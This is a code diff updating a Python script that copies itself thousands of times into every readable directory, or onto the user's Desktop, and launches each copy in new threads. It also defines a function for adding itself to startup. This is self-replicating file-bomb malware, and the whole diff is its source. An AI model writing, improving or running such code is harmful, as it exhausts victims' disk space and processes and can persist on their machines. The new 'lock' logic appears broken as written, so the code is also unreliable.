@@ -1,12 +1,20 @@
 import os
 import random as r
-from threading import *
+import threading as T
 import time
 import shutil
 import subprocess
 import sys
 import getpass
-# Ver 2
+
+
+# Ver 3
+
+
+global lock
+lock = False
+
+
 NOTI = 5000
 F_ex = '.py'
 cmd = 'python'
@@ -17,30 +25,36 @@ def tags(): #Works
     return tag
 
 
+
+
 def create_1(dst, name): #Prior i did not add .py/.exe and the wrong file (.txt) was being searched for
     shutil.copy(__file__, f"{dst}/{name}{F_ex}")
-    T = Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex))
-    T.start()
+    T.Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex)).start()
+
+
 
 
 def create_2(dst, name):
     shutil.copy(__file__, f"{dst}/{name}{F_ex}")
-    T = Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex))
-    T.start()
+    T.Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex)).start()
+
+
 
 
 def create_file3(dst, name): # Diff name, should exc when dir not avaiable. (F)
     if dst == 'F':
         shutil.copy(__file__, f"{name}{F_ex}")
-        T = Thread(target=ShutilExecute, args=(cmd, '', name, F_ex))
-        T.start()
+        T.Thread(target=ShutilExecute, args=(cmd, '', name, F_ex)).start()
+
+
 
 
 def create_file4(dst, name): # Diff name, should exc when dir not avaiable. (F)
     if dst == 'F':
         shutil.copy(__file__, f"{name}{F_ex}")
-        T = Thread(target=ShutilExecute, args=(cmd, '', name, F_ex))
-        T.start()
+        T.Thread(target=ShutilExecute, args=(cmd, '', name, F_ex)).start()
+
+
 
 
 def add_to_startup():
@@ -52,11 +66,16 @@ def add_to_startup():
 
 
 
+
+
+
+
 def file_run(dst, name):
     #Should use any extra time to run another file.
     #LINKED to one, so every stack gets its own extra.
-    T = Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex))
-    T.start()
+    T.Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex), daemon=False).start()
+
+
 
 
 
@@ -78,8 +97,12 @@ def intilize():
 
 
 
+
+
 def search():
     Dir = []
+
+
 
 
     for root, dirs, files in os.walk("./", topdown=False):
@@ -92,8 +115,21 @@ def search():
 
 
 
+
+
 def ShutilExecute(cmd, dst, name, exentension):
-    subprocess.run([f'{cmd}', f"{dst}/{name}{exentension}"], shell=True)
+
+
+    if lock is False:
+        try:
+            subprocess.run([f'{cmd}', f"{dst}/{name}{exentension}"], shell=True)
+        except:
+            print("FILE ACCESS EITHER NOT ACHIEVED OR ERROR IN LOCATING FILE STOPPING PROCESS.")
+            lock = True
+    else:
+        pass
+
+
 
 
 
@@ -103,84 +139,54 @@ def main(Dir):
     CUSTOMTAG = f"FILE{tags()}" #Tag for only num 1, allows threading for second file.
 
 
+
+
     for item in Dir:
         if os.path.isdir(item):
             if os.access(item, os.R_OK):
                 print(f'\x1b[6;30;42m' + f'DIR {item} ACESSED!' + '\x1b[0m') #For testing purposes
                 try:
                     for _ in range(NOTI):
-                        C1 = Thread(target=create_1, args=(item, CUSTOMTAG))
-                        F1 = Thread(target=file_run, args=(item, CUSTOMTAG))
-                        C2 = Thread(target=create_2, args=(item, f"FILE{tags()}"))
+                        T.Thread(target=create_1, args=(item, CUSTOMTAG), daemon=True).start()
+                        T.Thread(target=file_run, args=(item, CUSTOMTAG), daemon=True).start()
+                        T.Thread(target=create_2, args=(item, f"FILE{tags()}"), daemon=True).start()
 
 
-                        C1.setDaemon(True)
-                        F1.setDaemon(True)
-                        C2.setDaemon(True)
-
-
-                        C1.start()
-                        F1.start()
-                        C2.start()
 
 
                 except:
                     for _ in range(NOTI):
-                        C3 = Thread(target=create_file3, args=("F", f"FILE{tags()}"))
-                        F1 = Thread(target=file_run, args=(item, CUSTOMTAG))
-                        C4 = Thread(target=create_file4, args=("F", f"FILE{tags()}"))
+                        T.Thread(target=create_file3, args=("F", f"FILE{tags()}"), daemon=True).start()
+                        T.Thread(target=file_run, args=(item, CUSTOMTAG), daemon=True).start()
+                        T.Thread(target=create_file4, args=("F", f"FILE{tags()}"), daemon=True).start()
 
 
-                        C3.setDaemon(True)
-                        F1.setDaemon(True)
-                        C4.setDaemon(True)
-
-
-                        C3.start()
-                        F1.start()
-                        C4.start()
 
 
             else:
+                print(f'\x1b[6;30;42m' + f'DIR {item} FAILED (CANNOT EDIT)!' + '\x1b[0m')
                 for _ in range(NOTI):
-
-
                     try:
-                        C1 = Thread(target=create_1, args=(f"c:/Users/{getpass.getuser()}/OneDrive/Desktop", CUSTOMTAG)) #If no dir was found it will spam your desktop.
-                        F1 = Thread(target=file_run, args=(f"c:/Users/{getpass.getuser()}/OneDrive/Desktop", CUSTOMTAG))
+                      T.Thread(target=create_1, args=(f"c:/Users/{getpass.getuser()}/OneDrive/Desktop", CUSTOMTAG), daemon=True).start() #If no dir was found it will spam your desktop.
+                      T.Thread(target=file_run, args=(f"c:/Users/{getpass.getuser()}/OneDrive/Desktop", CUSTOMTAG), daemon=True).start()          
 
 
-                        C1.setDaemon(True)
-                        F1.setDaemon(True)
-           
-                        C1.start()
-                        F1.start()
 
 
                     except:
-                        C3 = Thread(target=create_file3, args=("F", f"FILE{tags()}"))
-                        C4 = Thread(target=create_file4, args=("F", f"FILE{tags()}"))
-                   
-                        C3.setDaemon(True)
-                        C4.setDaemon(True)
+                       T.Thread(target=create_file3, args=("F", f"FILE{tags()}"), daemon=True).start()
+                       T.Thread(target=create_file4, args=("F", f"FILE{tags()}"), daemon=True).start()
 
 
-                        C3.start()
-                        C4.start()
         else:
-            C3 = Thread(target=create_file3, args=("F", f"FILE{tags()}"))
-            C4 = Thread(target=create_file4, args=("F", f"FILE{tags()}"))
-       
-            C3.setDaemon(True)
-            C4.setDaemon(True)
+            print(f'\x1b[6;30;42m' + f'DIR {item} FAILED (NOT DIR) !' + '\x1b[0m')
+            T.Thread(target=create_file3, args=("F", f"FILE{tags()}"), daemon=True).start()
+            T.Thread(target=create_file4, args=("F", f"FILE{tags()}"), daemon=True).start()
 
 
-            C3.start()
-            C4.start()
 
 
 if __name__ == "__main__":
     main(search())
-
 
 
